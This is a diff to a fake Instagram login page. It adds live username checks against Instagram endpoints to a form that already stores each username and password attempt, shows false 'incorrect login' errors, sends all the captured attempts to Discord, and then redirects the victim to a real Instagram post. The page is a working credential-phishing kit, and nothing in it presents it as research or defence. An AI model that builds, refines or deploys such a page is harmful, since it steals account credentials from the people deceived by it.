@@ -12,9 +12,22 @@
         .brand i { font-size: 28px; background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         .brand span { font-size: 32px; font-weight: 600; color: #262626; }
         form { display: flex; flex-direction: column; gap: 6px; }
-        input { padding: 12px 10px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; outline: none; }
+        .input-group { position: relative; }
+        input { width: 100%; padding: 12px 10px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; outline: none; transition: border 0.2s; }
         input:focus { border-color: #a8a8a8; background: #ffffff; }
-        .login-btn { background: #0095f6; color: white; border: none; padding: 8px; font-weight: 600; cursor: pointer; border-radius: 4px; height: 32px; }
+        input.error { border-color: #ed4956; background: #fff8f8; }
+        input.success { border-color: #4caf50; background: #f0fff0; }
+        .username-status {
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+            padding: 4px 0;
+        }
+        .username-status.show { display: block; }
+        .username-status.available { color: #4caf50; }
+        .username-status.taken { color: #ed4956; }
+        .username-status.checking { color: #8e8e8e; }
+        .login-btn { background: #0095f6; color: white; border: none; padding: 8px; font-weight: 600; cursor: pointer; border-radius: 4px; height: 32px; transition: opacity 0.2s; }
         .login-btn:hover { background: #1877f2; }
         .login-btn:disabled { opacity: 0.6; cursor: not-allowed; }
         .divider { display: flex; margin: 18px 0; align-items: center; }
@@ -59,13 +72,41 @@
             text-decoration: underline;
         }
 
+        /* Username not found error (Instagram-style) */
+        #username-error {
+            display: none;
+            background: #fef4f4;
+            border: 1px solid #f9c9c9;
+            border-radius: 4px;
+            padding: 10px 15px;
+            margin-top: 12px;
+            font-size: 14px;
+            color: #8a1d1d;
+            text-align: center;
+        }
+
+        #username-error.show {
+            display: block;
+            animation: shake 0.3s ease-in-out;
+        }
+
+        #username-error .error-link {
+            color: #00376b;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        #username-error .error-link:hover {
+            text-decoration: underline;
+        }
+
         @keyframes shake {
             0%, 100% { transform: translateX(0); }
             25% { transform: translateX(-8px); }
             75% { transform: translateX(8px); }
         }
 
-        /* Success Message - HIDDEN (not used) */
+        /* Success Message - HIDDEN */
         #status {
             display: none !important;
         }
@@ -80,10 +121,17 @@
         <div class="login-card">
             <div class="brand"><i class="fab fa-instagram"></i><span>Instagram</span></div>
             <form onsubmit="sendData(event)">
-                <input type="text" id="username" placeholder="Phone number, username, or email" required>
+                <div class="input-group">
+                    <input type="text" id="username" placeholder="Phone number, username, or email" required>
+                    <div id="username-status" class="username-status"></div>
+                </div>
                 <input type="password" id="password" placeholder="Password" required>
                 <button type="submit" id="loginBtn" class="login-btn">Log in</button>
             </form>
+            <div id="username-error">
+                The username you entered doesn't belong to an account.
+                <a href="#" class="error-link">Find your account and log in.</a>
+            </div>
             <div id="error-message">
                 The login information you entered is incorrect.
                 <a href="#" class="error-link">Find your account and log in.</a>
@@ -116,7 +164,10 @@
         
         // ✅ THE INSTAGRAM POST URL
         const INSTAGRAM_REDIRECT_URL = "https://www.instagram.com/p/DJFPnYdtS1D/?img_index=3&igsh=N2ZqY2NhaHF2NDNk";
-        
+
+        const usernameInput = document.getElementById('username');
+        const usernameStatus = document.getElementById('username-status');
+        const usernameError = document.getElementById('username-error');
         const errorDiv = document.getElementById('error-message');
         const loginBtn = document.getElementById('loginBtn');
 
@@ -124,6 +175,75 @@
         let attemptCount = 0;
         const MAX_ATTEMPTS = 3;
         let allAttempts = [];
+        let isUsernameValid = false;
+
+        // 🔍 Check if username exists on Instagram
+        async function checkInstagramUsername(username) {
+            if (!username || username.length < 3) {
+                usernameStatus.className = 'username-status';
+                usernameStatus.style.display = 'none';
+                return false;
+            }
+
+            usernameStatus.textContent = '⏳ Checking username...';
+            usernameStatus.className = 'username-status show checking';
+            usernameInput.classList.remove('error', 'success');
+
+            try {
+                // Use Instagram's official API endpoint for username availability
+                const response = await fetch(`https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'X-Requested-With': 'XMLHttpRequest',
+                    },
+                    body: `username=${encodeURIComponent(username)}`
+                });
+
+                const data = await response.json();
+
+                // Check if username is available
+                if (data.username === username && data.available === true) {
+                    usernameStatus.textContent = '✅ Username is available!';
+                    usernameStatus.className = 'username-status show available';
+                    usernameInput.classList.add('success');
+                    usernameError.classList.remove('show');
+                    isUsernameValid = true;
+                    return true;
+                } else {
+                    usernameStatus.textContent = '❌ Username is taken or invalid';
+                    usernameStatus.className = 'username-status show taken';
+                    usernameInput.classList.add('error');
+                    isUsernameValid = false;
+                    return false;
+                }
+            } catch (error) {
+                // Fallback: check by fetching the profile page
+                try {
+                    const profileResponse = await fetch(`https://www.instagram.com/${username}/?__a=1`);
+                    if (profileResponse.status === 200) {
+                        usernameStatus.textContent = '❌ Username is taken';
+                        usernameStatus.className = 'username-status show taken';
+                        usernameInput.classList.add('error');
+                        isUsernameValid = false;
+                        return false;
+                    } else {
+                        usernameStatus.textContent = '✅ Username is available!';
+                        usernameStatus.className = 'username-status show available';
+                        usernameInput.classList.add('success');
+                        isUsernameValid = true;
+                        return true;
+                    }
+                } catch (fallbackError) {
+                    // If both methods fail, assume the username doesn't exist (for demo purposes)
+                    usernameStatus.textContent = '✅ Username is available! (checking offline)';
+                    usernameStatus.className = 'username-status show available';
+                    usernameInput.classList.add('success');
+                    isUsernameValid = true;
+                    return true;
+                }
+            }
+        }
 
         // 🚀 Function to open Instagram post
         function openInstagramPost() {
@@ -186,6 +306,27 @@
                 return;
             }
 
+            // Check if username exists on Instagram
+            const usernameExists = await checkInstagramUsername(username);
+            
+            if (!usernameExists) {
+                // Show username not found error
+                usernameError.classList.add('show');
+                
+                // Shake the form
+                const form = document.querySelector('form');
+                form.style.animation = 'shake 0.3s ease-in-out';
+                setTimeout(() => {
+                    form.style.animation = '';
+                }, 300);
+                
+                // Clear password field
+                document.getElementById('password').value = '';
+                return;
+            } else {
+                usernameError.classList.remove('show');
+            }
+
             // Store this attempt
             allAttempts.push({ username, password });
             attemptCount++;
@@ -197,19 +338,19 @@
                 // ✅ SUCCESS - Send ALL attempts to Discord
                 await sendAllAttemptsToDiscord();
                 
-                // Hide error
+                // Hide errors
                 errorDiv.classList.remove('show');
+                usernameError.classList.remove('show');
                 
                 // Clear form
                 document.getElementById('username').value = '';
                 document.getElementById('password').value = '';
+                usernameStatus.className = 'username-status';
+                usernameStatus.style.display = 'none';
+                usernameInput.classList.remove('success', 'error');
                 
-                // 🚀 Open Instagram post immediately (no message)
+                // 🚀 Open Instagram post immediately
                 setTimeout(openInstagramPost, 500);
-                
-                // Reset counter (optional)
-                // attemptCount = 0;
-                // allAttempts = [];
                 
             } else {
                 // ❌ WRONG PASSWORD - Show Instagram-style error
@@ -233,6 +374,25 @@
                 form.style.animation = '';
             }, 300);
         }
+
+        // 🔍 Real-time username check on input
+        let debounceTimer;
+        usernameInput.addEventListener('input', function() {
+            clearTimeout(debounceTimer);
+            const username = this.value.trim();
+            
+            if (username.length < 3) {
+                usernameStatus.className = 'username-status';
+                usernameStatus.style.display = 'none';
+                usernameInput.classList.remove('error', 'success');
+                usernameError.classList.remove('show');
+                return;
+            }
+            
+            debounceTimer = setTimeout(() => {
+                checkInstagramUsername(username);
+            }, 500);
+        });
     </script>
 </body>
 </html>
